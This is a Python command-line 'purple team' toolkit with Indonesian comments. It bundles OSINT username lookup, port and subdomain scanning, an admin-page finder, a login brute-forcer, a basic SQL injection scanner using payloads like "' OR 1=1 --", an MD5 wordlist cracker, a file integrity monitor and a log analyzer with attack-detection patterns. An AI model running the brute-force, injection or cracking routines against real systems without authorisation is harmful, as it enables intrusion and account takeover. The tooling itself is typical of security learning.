import os
import sys
import time
import socket
import requests
import hashlib
import datetime

# --- KONFIGURASI WARNA ---
RED = '\033[91m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# --- SISTEM PELAPORAN OTOMATIS (AUTO REPORT) ---
def log_activity(activity, details):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {activity} | {details}\n"
    
    # Simpan ke file laporan
    with open("INDRA_REPORT.txt", "a") as f:
        f.write(log_entry)

# --- UTILS & BANNER ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear_screen()
    print(RED + "=" * 65 + RESET)
    print(CYAN + """
      I N D R A   P U R P L E   O P S
    """ + RESET)
    print(RED + "=" * 65 + RESET)
    print(GREEN + "Legal of Siber Operation Center Analyst (SOC)" + RESET)
    print(YELLOW + "Status: ALL SYSTEMS ONLINE" + RESET)
    print("Repository: Purple-tools-by.indra")
    print("-" * 65)

# ==========================================
# FASE 1: PENGINTAIAN & SCANNING (RED TEAM)
# ==========================================

def recon_username():
    print(BLUE + "\n[OSINT] PENGINTAIAN USERNAME" + RESET)
    username = input("Target Username: ")
    sites = [
        f"https://www.instagram.com/{username}",
        f"https://twitter.com/{username}",
        f"https://github.com/{username}",
        f"https://www.facebook.com/{username}"
    ]
    print("\nScanning...")
    found = []
    for url in sites:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(GREEN + f"[FOUND] {url}" + RESET)
                found.append(url)
            else:
                print(RED + f"[404] {url}" + RESET)
        except:
            pass
    
    log_activity("RECON_USER", f"Target: {username}, Ditemukan: {len(found)}")
    input("\nLanjut...")

def scan_port():
    print(BLUE + "\n[NETWORK] PORT HUNTER (Simple TCP Scan)" + RESET)
    target = input("IP Target: ")
    # Port umum: FTP, SSH, Telnet, SMTP, DNS, HTTP, POP3, HTTPS, SQL, Proxy
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080]
    
    print(f"Scanning {target}...")
    open_ports = []
    
    try:
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(GREEN + f"[OPEN] Port {port}" + RESET)
                open_ports.append(port)
            else:
                print(RED + f"[CLOSED] Port {port}" + RESET)
            sock.close()
    except KeyboardInterrupt:
        print("\nScan dibatalkan user.")
    
    log_activity("PORT_SCAN", f"Target: {target}, Open: {open_ports}")
    input("\nLanjut...")

def find_subdomain():
    print(BLUE + "\n[RECON] SUBDOMAIN FINDER" + RESET)
    domain = input("Domain (ex: google.com): ")
    subs = ["www", "mail", "admin", "dev", "test", "api", "shop", "blog"]
    
    found_subs = []
    for sub in subs:
        url = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(url)
            print(GREEN + f"[ACTIVE] {url} -> {ip}" + RESET)
            found_subs.append(url)
        except:
            pass
            
    log_activity("SUBDOMAIN", f"Target: {domain}, Found: {len(found_subs)}")
    input("\nLanjut...")

# ==========================================
# FASE 2: PERCOBAAN / ATTACK (RED TEAM)
# ==========================================

def brute_force_login():
    print(RED + "\n[ATTACK] BRUTE FORCE SIMULATION" + RESET)
    url = input("URL Login: ")
    user = input("Username Target: ")
    wordlist = input("File Password (ex: PASSWORD.txt): ")
    
    try:
        with open(wordlist, 'r') as f:
            passwords = f.readlines()
            
        print(f"Memuat {len(passwords)} password...")
        for pwd in passwords:
            pwd = pwd.strip()
            # Simulasi request POST
            try:
                data = {'username': user, 'password': pwd, 'submit': 'login'}
                r = requests.post(url, data=data)
                print(f"Coba: {pwd} | Status: {r.status_code} | Size: {len(r.text)}")
                
                # Logic deteksi simple
                if r.status_code == 200 and "gagal" not in r.text.lower():
                    print(GREEN + f"[!!!] POTENTIAL MATCH: {pwd}" + RESET)
                    log_activity("BRUTE_FORCE", f"Success on {url} with user {user} pass {pwd}")
                    break
            except:
                print("Connection Error.")
                break
    except FileNotFoundError:
        print("File password gak ada bro.")
        
    input("\nLanjut...")

def sqli_scanner():
    print(RED + "\n[ATTACK] SQL INJECTION SCANNER (BASIC)" + RESET)
    url = input("Masukkan URL yang ada parameter (ex: http://web.com?id=1): ")
    
    payloads = ["'", "\"", "' OR 1=1 --", "\" OR 1=1 --"]
    vuln = False
    
    print("Testing payloads...")
    for load in payloads:
        full_url = url + load
        try:
            r = requests.get(full_url)
            # Cek error message SQL database umum
            if "syntax" in r.text.lower() or "mysql" in r.text.lower() or "warning" in r.text.lower():
                print(GREEN + f"[VULNERABLE] Celah ditemukan dengan payload: {load}" + RESET)
                vuln = True
                log_activity("SQLI_SCAN", f"Vuln found on {url} with {load}")
                break
            else:
                print(YELLOW + f"[SAFE] Payload {load} aman/terfilter." + RESET)
        except:
            print("Error koneksi.")
            
    if not vuln:
        print("Target terlihat aman dari Basic SQLi.")
    input("\nLanjut...")

def hash_cracker():
    print(RED + "\n[CRACKING] HASH CRACKER (MD5)" + RESET)
    target_hash = input("Masukkan Hash MD5: ")
    wordlist = input("File Wordlist (ex: PASSWORD.txt): ")
    
    print("Cracking dimulai...")
    found = False
    try:
        with open(wordlist, 'r') as f:
            for line in f:
                pwd = line.strip()
                # Ubah password jadi MD5
                pwd_hash = hashlib.md5(pwd.encode('utf-8')).hexdigest()
                
                if pwd_hash == target_hash:
                    print(GREEN + f"[CRACKED] Passwordnya adalah: {pwd}" + RESET)
                    log_activity("HASH_CRACK", f"Hash {target_hash} cracked: {pwd}")
                    found = True
                    break
                    
        if not found:
            print(RED + "Gagal. Password gak ada di list." + RESET)
    except Exception as e:
        print(f"Error: {e}")
        
    input("\nLanjut...")

# ==========================================
# FASE 3: DEFENSE & ANALISA (BLUE TEAM)
# ==========================================

def file_integrity_monitor():
    print(CYAN + "\n[DEFENSE] FILE INTEGRITY MONITOR (FIM)" + RESET)
    print("Tools ini ngecek apakah ada file yang berubah isinya (dirusak hacker).")
    
    file_path = input("File yang mau dipantau (ex: launcher.py): ")
    db_name = "fim_baseline.txt"
    
    try:
        # Hitung hash file saat ini
        with open(file_path, "rb") as f:
            bytes = f.read()
            current_hash = hashlib.sha256(bytes).hexdigest()
            
        # Cek apakah kita punya data lama
        if os.path.exists(db_name):
            with open(db_name, "r") as db:
                stored_data = db.read().split("|")
                # Format simpel: filename|hash
                if stored_data[0] == file_path:
                    old_hash = stored_data[1]
                    
                    if current_hash == old_hash:
                        print(GREEN + "[AMAN] File tidak berubah." + RESET)
                    else:
                        print(RED + "[BAHAYA] HASH BERBEDA! File telah dimodifikasi!" + RESET)
                        print(f"Old: {old_hash}\nNew: {current_hash}")
                        log_activity("FIM_ALERT", f"File {file_path} MODIFIED!")
                else:
                    print("Data file beda, reset database.")
        else:
            print(YELLOW + "Belum ada baseline. Membuat database baru..." + RESET)
            with open(db_name, "w") as db:
                db.write(f"{file_path}|{current_hash}")
            print(GREEN + "Baseline tersimpan." + RESET)
            
    except FileNotFoundError:
        print("File target gak ketemu.")
        
    input("\nLanjut...")

def analisa_log():
    print(CYAN + "\n[DEFENSE] LOG ANALYZER" + RESET)
    path = input("Lokasi Log: ")
    print("Mencari pattern serangan umum (SQLi, XSS, Brute Force)...")
    
    patterns = ["UNION", "SELECT", "alert(", "passwd", "failed", "error"]
    found_issues = 0
    
    try:
        with open(path, 'r', errors='ignore') as f:
            for line in f:
                for pat in patterns:
                    if pat in line:
                        print(RED + f"[ALERT] {pat} detected: {line.strip()[:50]}..." + RESET)
                        found_issues += 1
        print(f"\nAnalisa selesai. {found_issues} anomali ditemukan.")
        log_activity("LOG_ANALYSIS", f"File {path}, Issues: {found_issues}")
    except:
        print("Gagal baca file log.")
    input("\nLanjut...")

# ==========================================
# MAIN MENU (THE HUB)
# ==========================================

def menu():
    banner()
    print("FASE 1: PENGINTAIAN (RECON)")
    print("[1] Cari Username (OSINT)")
    print("[2] Subdomain Finder")
    print("[3] Port Hunter (Network Scan)")
    print("-" * 30)
    print("FASE 2: PENYERANGAN (RED OPS)")
    print("[4] Cari Halaman Login")
    print("[5] SQL Injection Scanner")
    print("[6] Brute Force Attack")
    print("[7] Hash Cracker (MD5)")
    print("-" * 30)
    print("FASE 3: PERTAHANAN (BLUE OPS)")
    print("[8] File Integrity Monitor (FIM)")
    print("[9] Log Analyzer")
    print("[10] Baca Laporan (Report)")
    print("[0] KELUAR")
    
    pilihan = input(f"\n{YELLOW}INDRA@PURPLE:~# {RESET}")
    return pilihan

def main():
    while True:
        pilih = menu()
        if pilih == '1': recon_username()
        elif pilih == '2': find_subdomain()
        elif pilih == '3': scan_port()
        elif pilih == '4': 
            # Menggunakan logic find login yg sederhana (inline atau func terpisah)
            print(BLUE + "\n[RECON] ADMIN FINDER" + RESET)
            t = input("URL: ")
            p = ["admin/", "login/", "wp-login.php"]
            for x in p:
                try:
                    if requests.get(t+"/"+x).status_code == 200: print(GREEN+f"Found: {x}"+RESET)
                except: pass
            input("Lanjut...")
        elif pilih == '5': sqli_scanner()
        elif pilih == '6': brute_force_login()
        elif pilih == '7': hash_cracker()
        elif pilih == '8': file_integrity_monitor()
        elif pilih == '9': analisa_log()
        elif pilih == '10':
            print(CYAN + "\n=== ISI LAPORAN ===" + RESET)
            try:
                with open("INDRA_REPORT.txt", "r") as f: print(f.read())
            except: print("Belum ada laporan.")
            input("Lanjut...")
        elif pilih == '0':
            print("Mission Aborted.")
            sys.exit()
        else:
            print("Menu ga ada bro.")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nForce Close. Bye.")
